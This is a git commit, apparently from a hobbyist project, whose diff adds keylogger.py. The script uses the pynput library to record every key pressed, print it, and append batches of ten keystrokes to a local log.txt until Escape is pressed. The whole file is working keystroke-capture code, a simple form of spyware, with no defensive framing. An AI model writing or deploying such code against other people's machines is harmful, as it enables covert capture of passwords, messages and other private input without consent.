a9a4049bbbb451fdc4e7c0960c6df20653bc5f14
Kennedy <Tuks1032@gmail.com>
2023-09-07 10:16:27 +0200

    add text file that holds keys

--- keylogger.py
+++ keylogger.py
@@ -1,5 +1,40 @@
+# importing pynput to use its functions to capture key inputs
+import pynput
+from pynput.keyboard import Key, Listener
 
+count = 0
+keys = []
 
+def on_press(key):
+    global keys, count
+    
+    keys.append(key)
+    count += 1
+    print("{0} pressed".format(key))
+    
+    if count >= 10:
+        count = 0
+        write_file(keys)
+        keys = []
+   
+#breaks out of the loop 
+def on_release(key):
+    if key == Key.esc:
+        return False
+    
+def write_file(key):
+    with open('log.txt', 'a') as f:
+        for key in keys:
+            #removes teh quotation marks
+            k = str(key).replace("'","")
+            #removes the word space
+            if k.find("space") > 0:
+                f.write(' ')
+            elif k.find('Key') == -1:
+                f.write(k)
+
+with Listener(on_press = on_press, on_release = on_release) as listener:
+    listener.join()
 
 if('__main__' == __name__):
     print('it works')
